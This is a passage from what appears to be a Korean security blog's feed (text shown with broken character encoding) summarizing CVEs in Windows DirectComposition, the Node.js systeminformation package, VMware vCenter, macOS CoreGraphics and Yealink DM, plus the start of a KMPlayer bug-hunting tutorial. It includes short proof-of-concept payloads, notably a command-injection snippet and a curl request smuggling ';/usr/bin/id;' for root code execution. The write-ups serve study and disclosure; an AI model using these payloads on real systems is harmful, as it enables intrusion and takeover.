href="https://hackyboiz.github.io/2021/01/01/l0ch/2021-01-01/">CVE-2020-17057</a>/ZDI-20-1371</h1><p><strong>Microsoft Windows DirectComposition Uninitialized Pointer Privilege Escalation Vulnerability</strong></p><p>ì´ ì·¨ì•½ì ì€ Windowsì˜ DirectCompositionì´ë¼ëŠ” ì»¤ë„ ëª¨ë“œì˜ ê·¸ë˜í”½ êµ¬ì„±ìš”ì†Œì—ì„œ ë°œê²¬ëœ ì·¨ì•½ì ì´ë‹¤. <code>win32kbase!DirectComposition::CInteractionTrackerMarshaler::SetBufferProperty</code> í•¨ìˆ˜ëŠ” ìœ ì € ëª¨ë“œì—ì„œ ì „ë‹¬ëœ ë°ì´í„°ë¥¼ ê¸°ì¤€ìœ¼ë¡œ <code>DirectComposition::CInteractionTrackerMarshaler</code> íƒ€ì…ì˜ ê°ì²´ë¥¼ ì±„ìš´ë‹¤. ë§Œì•½ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ëŠ” ê³¼ì •ì—ì„œ ë¹„ì •ìƒì ì¸ ë°ì´í„°ë¥¼ ë°œê²¬í•˜ë©´, ì—ëŸ¬ë¥¼ í•¸ë“¤ë§í•˜ëŠ” ë¶„ê¸°ë¡œ ë“¤ì–´ê°€ê²Œ ë˜ëŠ”ë°, ì—¬ê¸°ì—ì„œ í•¨ìˆ˜ì—ì„œ ìƒì„±í•œ ê°ì²´ì— ìˆëŠ” ë¦¬ì†ŒìŠ¤ë“¤ì„ release í•œë‹¤. Release ê³¼ì •ì—ì„œ ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ í¬ì¸í„°ë¥¼ release í•˜ê²Œ ëœë‹¤. ì´ë¥¼ í†µí•´ í•´ì»¤ëŠ” ì»¤ë„ ëª¨ë“œì—ì„œ ì‹¤í–‰ íë¦„ì„ ì œì–´í•  ìˆ˜ ìˆê³  ê²°ê³¼ì ìœ¼ë¡œ SYSTEM ê¶Œí•œì„ íšë“í•  ìˆ˜ ìˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>j0ker</tag>
      
      <tag>zdi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-21315: node js library command injection</title>
    <link href="/2021/03/20/fabu1ous/2021-03-20/"/>
    <url>/2021/03/20/fabu1ous/2021-03-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC">CVE-2021-21315-systeminformation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>systeminformation Library for Node.JS (npm package â€œsysteminformationâ€) &lt; 5.3.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>CVE-2021-21315ëŠ” npm íŒ¨í‚¤ì§€ì¸  <code>systeminformation</code>ì—ì„œ ë°œìƒí•˜ëŠ” command injection ì·¨ì•½ì ì…ë‹ˆë‹¤. <code>systeminformation</code> íŒ¨í‚¤ì§€ëŠ” í•˜ë“œì›¨ì–´, ì‹œìŠ¤í…œ ë° OS ë“±ì˜ ì„¸ë¶€ ì •ë³´ë¥¼ ê²€ìƒ‰í•˜ëŠ” ê¸°ëŠ¥ì˜ ì˜¤í”ˆ ì†ŒìŠ¤ í•¨ìˆ˜ ëª¨ìŒì…ë‹ˆë‹¤. ê·¸ì¤‘ <code>si.inetLatency()</code>, <code>si.inetChecksite()</code>, <code>si.services()</code>, <code>si.processLoad()</code> ì— ì‚¬ìš©ë  íŒŒë¼ë¯¸í„° ê°’ì€ sanitizing í•´ì•¼ í•˜ë©° array í˜•íƒœë¡œ ë“¤ì–´ì˜¤ëŠ” ë°ì´í„°ë¥¼ ëª¨ë‘ ì°¨ë‹¨í•´ì•¼ í•©ë‹ˆë‹¤.</p><p>String array ë°ì´í„°ëŠ” í•¨ìˆ˜ <code>sanitizeShellString()</code>ì˜ sanitizing ì‘ì—…ì„ ë¬´ì‹œí•  ìˆ˜ ìˆì–´<code>si.inetLatency()</code>, <code>si.inetChecksite()</code>, <code>si.services()</code>, <code>si.processLoad()</code> í•¨ìˆ˜ë“¤ì˜ ì„œë¹„ìŠ¤ íŒŒë¼ë¯¸í„°ë¡œ ì‚¬ìš©ë  ì‹œ command injectionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs bash">const si = require(<span class="hljs-string">&#x27;systeminformation&#x27;</span>);const <span class="hljs-built_in">command</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$(&lt;OS Command&gt;)</span>&quot;</span>;si.inetChecksite([<span class="hljs-built_in">command</span>]);</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>command injection</tag>
      
      <tag>node js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-21972: VMware vCenterì˜ ì¸ì¦ë˜ì§€ ì•Šì€ ì‹œìŠ¤í…œ ê¶Œí•œì˜ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/03/19/l0ch/2021-03-19/"/>
    <url>/2021/03/19/l0ch/2021-03-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/unauth-rce-vmware/">Unauthorized RCE in VMware vCenter</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>vmware vcenter_server 7.0 U1c ì´ì „</li><li>vmware vcenter_server 6.7 U3l ì´ì „</li><li>vmware vcenter_server 6.5 U3n ì´ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMware ì¤‘ì•™ ì§‘ì¤‘ì‹ ê´€ë¦¬ ìœ í‹¸ë¦¬í‹°ì´ë©° ì—¬ëŸ¬ ê°€ìƒ ì‹œìŠ¤í…œ ë° ESXi í˜¸ìŠ¤íŠ¸ì™€ êµ¬ì„± ìš”ì†Œë¥¼ ê´€ë¦¬í•˜ëŠ” vCenterì—ì„œ unrestricted file upload, path traversal ì·¨ì•½ì ì„ ì´ìš©í•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì— ëŒ€í•œ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” <code>uploadova</code> ì—”ë“œí¬ì¸íŠ¸ì˜ ê²½ë¡œì¸ <code>/ui/vropspluginui/rest/services/*</code> ëŠ” ì¸ì¦ ì—†ì´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c">@RequestMapping(value = &#123;<span class="hljs-string">&quot;/uploadova&quot;</span>&#125;, method = &#123;RequestMethod.POST&#125;)    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">uploadOvaFile</span><span class="hljs-params">(@RequestParam(value = <span class="hljs-string">&quot;uploadFile&quot;</span>,required = <span class="hljs-literal">true</span>) CommonsMultipartFile uploadFile, HttpServletResponse response)</span> throws Exception </span>&#123;...        <span class="hljs-keyword">if</span> (!uploadFile.isEmpty()) &#123;            <span class="hljs-keyword">try</span> &#123;                ...                InputStream inputStream = uploadFile.getInputStream();                File dir = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/tmp/unicorn_ova_dir&quot;</span>);                <span class="hljs-keyword">if</span> (!dir.exists()) &#123;                    dir.mkdirs();                &#125; <span class="hljs-keyword">else</span> &#123;                    String[] entries = dir.<span class="hljs-built_in">list</span>();                    String[] var9 = entries;                    <span class="hljs-keyword">int</span> var10 = entries.length;                    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var11 = <span class="hljs-number">0</span>; var11 &lt; var10; ++var11) &#123;                        String entry = var9[var11];                        File currentFile = <span class="hljs-keyword">new</span> File(dir.getPath(), entry);                        currentFile.<span class="hljs-keyword">delete</span>();                    &#125;                    logger.info(<span class="hljs-string">&quot;Successfully cleaned : /tmp/unicorn_ova_dir&quot;</span>);                &#125;                TarArchiveInputStream in = <span class="hljs-keyword">new</span> TarArchiveInputStream(inputStream);                TarArchiveEntry entry = in.getNextTarEntry();                ArrayList result = <span class="hljs-keyword">new</span> ArrayList();...</code></pre><p><code>uploadova</code> ëŠ” ì•„ì¹´ì´ë¸Œ íŒŒì¼ì„ ë°›ì•„ <code>/tmp/unicorn_ova_dir</code> ê²½ë¡œì— í•´ë‹¹ ì•„ì¹´ì´ë¸Œ íŒŒì¼ì„ ì—´ì–´ íŒŒì¼ì„ ìƒì„±í•˜ëŠ”ë°, ìƒì„±ë˜ëŠ” ì•„ì¹´ì´ë¸Œ ë‚´ë¶€ì˜ íŒŒì¼ ì´ë¦„ì— ëŒ€í•œ ê²€ì¦ì´ ì—†ì–´ <code>../</code> ì„ í¬í•¨í•˜ì—¬ ì›í•˜ëŠ” ìœ„ì¹˜ì— íŒŒì¼ ì—…ë¡œë“œê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>Windowsì˜ ê²½ìš° í•´ì»¤ê°€ <code>.jsp</code> í˜•ì‹ì˜ ì›¹ ì‰˜ì„ ë§ˆì°¬ê°€ì§€ë¡œ ì¸ì¦ ì—†ì´ ì ‘ê·¼ ê°€ëŠ¥í•œ ì—”ë“œí¬ì¸íŠ¸ ê²½ë¡œì¸ <code>C:\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\</code> ì— ì—…ë¡œë“œí•˜ê³  ì ‘ê·¼í•˜ë©´ ì‹œìŠ¤í…œ ê¶Œí•œìœ¼ë¡œ vCenter í˜¸ìŠ¤íŠ¸ì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ì´í›„ ëª¨ë“  ì—”ë“œí¬ì¸íŠ¸ê°€ ì¸ì¦ í›„ ì ‘ê·¼ì´ ê°€ëŠ¥í•˜ë„ë¡ íŒ¨ì¹˜ë˜ì—ˆì§€ë§Œ ì—¬ì „íˆ íŒŒì¼ ì—…ë¡œë“œ ë° path traversal ì·¨ì•½ì ì€ ë‚¨ì•„ìˆê¸° ë•Œë¬¸ì— ì¸ì¦ëœ í´ë¼ì´ì–¸íŠ¸ì— ì˜í•œ ê³µê²©ì—ëŠ” PoCê°€ ìœ íš¨í•œ ê²ƒìœ¼ë¡œ ì•Œë ¤ì¡ŒìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>vmware</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
      <tag>unrestricted file upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] macOS: Integer overflow in CoreGraphics leading to oob write</title>
    <link href="/2021/03/18/insu/2021-03-18/"/>
    <url>/2021/03/18/insu/2021-03-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2130">macOS: Integer overflow in CoreGraphics leading to out-of-bounds write when rendering fonts</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>CoreGraphics, Big Sur version 11.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>macOS CoreGraphicsì—ì„œ í°íŠ¸ë¥¼ ë Œë”ë§ í•  ë•Œ out-of-bound writeê°€ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ glyphsë¥¼ bitmapìœ¼ë¡œ ë Œë”ë§ í•  ë•Œ CoreGraphics libraryì˜ ë²”ìœ„ ê²€ì¦ ë¯¸í¡ìœ¼ë¡œ ì¸í•´ ë°œìƒí•©ë‹ˆë‹¤. glyph bitmapì„ ë Œë”ë§ í•˜ê¸° ìœ„í•œ delta ê¸°ë°˜ì˜ anti-aliasing ì•Œê³ ë¦¬ì¦˜ì€ <code>2^30</code>ë³´ë‹¤ ì‘ì€ ì¢Œí‘œë§Œ ì˜¬ë°”ë¥´ê²Œ ì²˜ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ ì¢Œí‘œì— ëŒ€í•œ ê²€ì‚¬ê°€ ì¡´ì¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v96 &gt;&gt; <span class="hljs-number">12</span> == v94 &gt;&gt; <span class="hljs-number">12</span> )              &#123;                v106 = v101 - v100;(<span class="hljs-number">1</span>)             v107 = (v96 + v94) &gt;&gt; <span class="hljs-number">13</span>;                v108 = v96 - v94;                <span class="hljs-keyword">if</span> ( v96 - v94 &lt; <span class="hljs-number">1</span> )                  v108 = v94 - v96;                <span class="hljs-keyword">if</span> ( v94 - v96 &gt; <span class="hljs-number">0</span> )                  LOWORD(v96) = v94;                v109 = (v106 * (v108 - ((<span class="hljs-number">2</span> * (<span class="hljs-keyword">unsigned</span> __int16)v96) &amp; <span class="hljs-number">0x1FFE</span>) + <span class="hljs-number">0x2000</span>)) &gt;&gt; <span class="hljs-number">13</span>;(<span class="hljs-number">2</span>)             *(_WORD *)(v86 + <span class="hljs-number">2</span> * v107) += v109;(<span class="hljs-number">3</span>)             *(_WORD *)(v86 + <span class="hljs-number">2</span> * v107 + <span class="hljs-number">2</span>) += v106 - v109;                v90 = v160;              &#125;</code></pre><p>(1)ì—ì„œ ë‘ ì¢Œí‘œì˜ ì¤‘ê°„ ì§€ì ì„ ê³„ì‚°í•˜ê³  ìˆ«ìë¡œ ë³€í™˜í•©ë‹ˆë‹¤. ì´ë•Œ x ì¢Œí‘œëŠ” ë‘˜ ë‹¤ <code>-2^30</code>ë³´ë‹¤ ì‘ìœ¼ë¯€ë¡œ ë‘ ê°’ì„ ë”í•  ê²½ìš° integer overflowê°€ ë°œìƒí•˜ì—¬ ê°’ì´ í° ì–‘ì˜ ì •ìˆ˜ê°€ ë©ë‹ˆë‹¤. ì´ë¡œ ì¸í•´ (2)ì™€ (3)ì—ì„œ oob writeê°€ ë°œìƒí•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>oob</tag>
      
      <tag>insu</tag>
      
      <tag>mac</tag>
      
      <tag>coregraphics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Yealink DM Pre-Auth root level RCE</title>
    <link href="/2021/03/18/idioth/2021-03-18/"/>
    <url>/2021/03/18/idioth/2021-03-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-yealink-dm-pre-auth-root-level-rce/">SSD Advisory â€“ Yealink DM Pre Auth â€˜rootâ€™ level RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Yealink DM 3.6.0.20 ë²„ì „ ì´í•˜</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í†µí•© ê°œë°œ ë° ë°°í¬, ì‹¤ì‹œê°„ ëª¨ë‹ˆí„°ë§ ë° ê²½ê³ , ì›ê²© ë¬¸ì œ í•´ê²° ë“±ì˜ ì†”ë£¨ì…˜ì„ ê°€ì§„ Yealink Device Management(ì´í•˜ Yealink DM) platformì—ì„œ ì¸ì¦ë˜ì§€ ì•Šì€ ì›ê²© ì‚¬ìš©ìê°€ ì„ì˜ ëª…ë ¹ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì›ê²© ì½”ë“œ ì‹¤í–‰ì€ pre-auth SSRF ì·¨ì•½ì ê³¼ Command Injection ì·¨ì•½ì ì„ ì²´ì´ë‹ í•˜ì—¬ íŠ¸ë¦¬ê±° ë©ë‹ˆë‹¤. SSRF ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” <code>/usr/local/yealink/dmweb/api/index.js</code> ì½”ë“œ ì¼ë¶€ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs javascript"> <span class="hljs-number">17</span> <span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">app</span> =&gt;</span> &#123; <span class="hljs-number">18</span>     app.use(<span class="hljs-string">&#x27;/premise&#x27;</span>, router); <span class="hljs-number">19</span> &#125;;[...]<span class="hljs-number">217</span> router.get(<span class="hljs-string">&#x27;/front/getPingData&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<span class="hljs-number">218</span>     <span class="hljs-comment">// res.send(&#123;&quot;ret&quot;:1,&quot;data&quot;:&quot;PING www.baidu.com (14.215.177.38): 56 data bytes\n64 bytes from 14.215.177.38: seq=0 ttl=54 time=15.084 ms\n64 bytes from 14.215.177.38: seq=1 ttl=54 time=15.888 ms\n64 bytes from 14.215.177.38: seq=2 ttl=54 time=15.742 ms\n64 bytes from 14.215.177.38: seq=3 ttl=54 time=15.622         ms\n64 bytes from 14.215.177.38: seq=4 ttl=54 time=16.384 ms\n\n--- www.baidu.com ping statistics ---\n5 packets transmitted, 5 packets received, 0% packet loss\nround-trip min/avg/max = 15.084/15.744/16.384 ms\n&quot;,&quot;error&quot;:null&#125;)</span><span class="hljs-number">219</span>     <span class="hljs-comment">// return;</span><span class="hljs-number">220</span>     <span class="hljs-keyword">try</span> &#123;<span class="hljs-number">221</span>         <span class="hljs-keyword">let</span> url = req.query.url;<span class="hljs-number">222</span>         <span class="hljs-comment">// ï¿½ï¿½telnetï¿½ï¿½ï¿½ï¿½ï¿½posï¿½ï¿½ï¿½pingï¿½traceï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ç«¯ï¿½ï¿½ï¿½ï¿½ï¿½posï¿½ï¿½ä»¥ï¿½å¹¶ï¿½posä¼ ï¿½ï¿½</span><span class="hljs-number">223</span>         <span class="hljs-keyword">let</span> pos = req.query.pos;<span class="hljs-number">224</span>         <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`url===<span class="hljs-subst">$&#123;url&#125;</span>`</span>);<span class="hljs-number">225</span>         <span class="hljs-keyword">let</span> headers = &#123;<span class="hljs-number">226</span>             <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<span class="hljs-number">227</span>             <span class="hljs-string">&#x27;User-Agent&#x27;</span>: req.headers[<span class="hljs-string">&#x27;user-agent&#x27;</span>],<span class="hljs-number">228</span>             <span class="hljs-string">&#x27;x-forwarded-for&#x27;</span>: commom.getClientIP(req),<span class="hljs-number">229</span>             token: req.session.token<span class="hljs-number">230</span>         &#125;;<span class="hljs-number">231</span>         request.get(&#123;<span class="hljs-number">232</span>             url: url,<span class="hljs-number">233</span>             headers: headers,<span class="hljs-number">234</span>             timeout: <span class="hljs-number">60000</span>,<span class="hljs-number">235</span>             qs: &#123;<span class="hljs-number">236</span>                 pos: pos<span class="hljs-number">237</span>             &#125;<span class="hljs-number">238</span>         &#125;).pipe(res);<span class="hljs-number">239</span>     &#125; <span class="hljs-keyword">catch</span> (e) &#123;<span class="hljs-number">240</span>         <span class="hljs-built_in">console</span>.error(e);<span class="hljs-number">241</span>         res.send(<span class="hljs-number">242</span>             errcode.MakeResult(<span class="hljs-number">243</span>                 errcode.ERR,<span class="hljs-number">244</span>                 e,<span class="hljs-number">245</span>                 errcode.INTERNAL_ERROR,<span class="hljs-number">246</span>                 <span class="hljs-string">&#x27;server.common.internal.error&#x27;</span><span class="hljs-number">247</span>             )<span class="hljs-number">248</span>         );<span class="hljs-number">249</span>     &#125;<span class="hljs-number">250</span> &#125;);</code></pre><p>17ë²ˆ ì¤„ì—ì„œ ì¶”ê°€ì ì¸ API ì‚¬ìš©ì„ ìœ„í•´ <code>/premise</code> routeë¥¼ ì •ì˜í•©ë‹ˆë‹¤. ê·¸ í›„ 217ë²ˆ ì¤„ì—ì„œ <code>/premise/front/getPingData</code>ë¥¼ GET ë©”ì†Œë“œì˜ routeë¡œ ì •ì˜í•©ë‹ˆë‹¤. 232ë²ˆ ì¤„ì—ì„œ íŠ¹ì • í—¤ë”ë¥¼ ì‚¬ìš©í•˜ì—¬ URLì„ GET ë©”ì†Œë“œë¡œ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í—¤ë”ëŠ” 225ì¤„ì—ì„œ ì •ì˜ë˜ì–´ ìˆìœ¼ë¯€ë¡œ í•´ë‹¹ í—¤ë” ê°’ìœ¼ë¡œ URLì„ ì „ì†¡í•˜ë©´ í•´ì»¤ê°€ ì œì–´í•˜ëŠ” URLì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ í†µí•´ <code>0.0.0.0:9600/tcp</code>ì—ì„œ rootë¡œ ì‹¤í–‰ë˜ëŠ” <code>smserver</code> ë°ëª¬ì— ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤. <code>smserver</code>ì˜ <code>mod_firewall.so</code> ëª¨ë“ˆì—ëŠ” Command injectionì„ í•  ìˆ˜ ìˆëŠ” <code>fw_restful_service_get()</code> í•¨ìˆ˜ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ëŠ” <code>zone=</code>ì— ë“¤ì–´ì˜¨ GET ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ SSRFë¥¼ í†µí•´ <code>smserver</code>ì— payloadë¥¼ ì‘ì„±í•˜ì—¬ ë³´ë‚´ë©´ root ê¶Œí•œìœ¼ë¡œ Remote  Code Executionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs asciidoc">curl --insecure &quot;<span class="hljs-link">https://</span>[<span class="hljs-string">target</span>]/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;&quot;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>pre-auth</tag>
      
      <tag>yealink</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ Part 2</title>
    <link href="/2021/03/17/l0ch/bughunting-tutorials-part2/"/>
    <url>/2021/03/17/l0ch/bughunting-tutorials-part2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ Part 1</a></p><p>ì§€ë‚œ Part 1ì— ì´ì–´ íƒ€ê¹ƒ í”„ë¡œê·¸ë¨ ì„ ì •ê³¼ ì·¨ì•½ì ì´ ë°œìƒí•œ íŒŒì¼ í¬ë§·ì„ ë¶„ì„í•´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤!</p><h1 id="ë²„ê·¸ë°”ìš´í‹°-KMPlayer"><a href="#ë²„ê·¸ë°”ìš´í‹°-KMPlayer" class="headerlink" title="ë²„ê·¸ë°”ìš´í‹° - KMPlayer"></a>ë²„ê·¸ë°”ìš´í‹° - KMPlayer</h1><p>ì œê°€ ì˜ˆì‹œë¡œ ë“¤ í”„ë¡œê·¸ë¨ì€ KMPlayerì…ë‹ˆë‹¤. ë‹¤ë“¤ KMPlayer ì•„ì‹œì£ ?? ì“°ì‹œëŠ” ë¶„ë“¤ë„ ìˆì„ ê±°ê³ </p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image0.jpg"></p><blockquote><p>ì¶œì²˜ : ë„¤ì´ë²„ ì†Œí”„íŠ¸ì›¨ì–´ ìë£Œì‹¤</p></blockquote><p>KMPlayerì˜ ê²½ìš° ì›ë˜ëŠ” ë™ì˜ìƒ í”Œë ˆì´ì–´ì´ì§€ë§Œ ìŒì•…ë„ í”Œë ˆì´í•´ì£¼ê³  ì‚¬ì§„ë„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì œê°€ ì°¾ì•˜ë˜ ì·¨ì•½ì ì€ ì‚¬ì§„ í¬ë§· ì¤‘ í•˜ë‚˜ì¸ .dib í¬ë§·ì—ì„œ ë°œìƒí•œ í™ ì˜¤ë²„í”Œë¡œìš° ì·¨ì•½ì ì…ë‹ˆë‹¤. ì˜¬í•´(2017ë…„) 4 ì›”ì¸ê°€ ì œë³´í•˜ê³  7 ì›”ì— íŒ¨ì¹˜ê°€ ë˜ì—ˆë„¤ìš”.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image1.png"></p><p>ì´ ì·¨ì•½ì ìœ¼ë¡œ ì„¤ëª…ì„ í•˜ëŠ” ì´ìœ ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>dib í¬ë§·ì€ ì••ì¶•í•˜ì§€ ì•Šê³  ê·¸ëƒ¥ ë¹„íŠ¸ë§µ ì •ë³´ë¥¼ raw í•˜ê²Œ ì €ì¥í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ë¶„ì„ì„ í•  ë•Œë‚˜ ìµìŠ¤ë¥¼ í•  ë•Œë‚˜ ì•„ì£¼ í¸í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì…ë¬¸ìë¶„ë“¤ì´ ì²˜ìŒ ê³µë¶€ë¥¼ í•  ë•Œ ë§¤ìš° ì‰½ê²Œ ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ê³  ìƒê°í–ˆìŠµë‹ˆë‹¤.</li><li>ë¶„ì„í•  ì½”ë“œ ì»¤ë²„ë¦¬ì§€ê°€ ì‘ê³  ì·¨ì•½ì ì´ ë‹¨ìˆœí•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ë®¤í…Œì´íŠ¸ í•´ì•¼ í•  ë°”ì´íŠ¸ë„ ì ê³ ìš”. ë§ ê·¸ëŒ€ë¡œ ì‰¬ì›Œì„œ??</li><li>KMPlayerëŠ” ì˜ˆì „ ë²„ì „ì„ ë‹¤ìš´ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ë¥¸ ê±´ ì·¨ì•½ì ì„ ì°¾ì•„ë„ í™˜ê²½ êµ¬ì„±ì´ ì•ˆë˜ë©´ ì´ëŸ° ê¸€ì„ ì“¸ ìˆ˜ê°€ ì—†ì–´ìš” ã… ã…  </li></ol><p>ê·¸ë˜ì„œ ì´ì œ ì‹œì‘í•´ë³´ì£  ã…‹ã…‹ã…‹ ì¼ë‹¨ ë¨¼ì € ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ë²„ì „ì„ ë‹¤ìš´ ë°›ì•„ ë³´ì£ .</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image2.png"></p><p>ì œê°€ ìµìŠ¤í”Œë¡œì‡ì„ ì§„í–‰í–ˆë˜ ë²„ì „ì€ 4.1.5.8ì…ë‹ˆë‹¤. ì‚¬ì‹¤ 4.2.1.4 ì´ì „ ë²„ì „ ì•„ë¬´ê±°ë‚˜ ë‹¤ìš´ ë°›ìœ¼ì…”ë„ ë˜ëŠ” ë° ì œê°€ ì°¾ì•„ ë†“ì€ ê°€ì ¯ì´ë‚˜ ì •ë³´ë“¤ì´ ë‹¤ ì € ë²„ì „ì´ì–´ì„œ ìµìŠ¤ ë‹¤ì‹œ ì§œê¸° ê·€ì°®ê¸° ë•Œë¬¸ì— ê·¸ëƒ¥ ì´ ë²„ì „ìœ¼ë¡œ ì§„í–‰í•˜ê² ìŠµë‹ˆë‹¤ ã…‹ã…‹ã…‹</p><p>ê·¸ë¦¬ê³  ì´ì œ ì‹œë“œ íŒŒì¼ì„ ë§Œë“¤ ê±´ë° ë§Œë“  íŒŒì¼ì„ ëœ¯ì–´ë³´ë©´ì„œ dib íŒŒì¼ í¬ë§·ì— ëŒ€í•´ì„œ ê°„ë‹¨íˆ ì•Œì•„ë³´ë„ë¡ í• ê²Œìš”. </p><p>ì•ì„œ ë§í–ˆë‹¤ì‹œí”¼ dib í¬ë§·ì€ ë¬´ì••ì¶• ë¹„íŠ¸ë§µ ì´ë¯¸ì§€ í¬ë§·ì…ë‹ˆë‹¤. êµ¬ì¡°ê°€ ë§¤ìš° ê°„ë‹¨í•˜ê³  ë¹„íŠ¸ë§µ ì 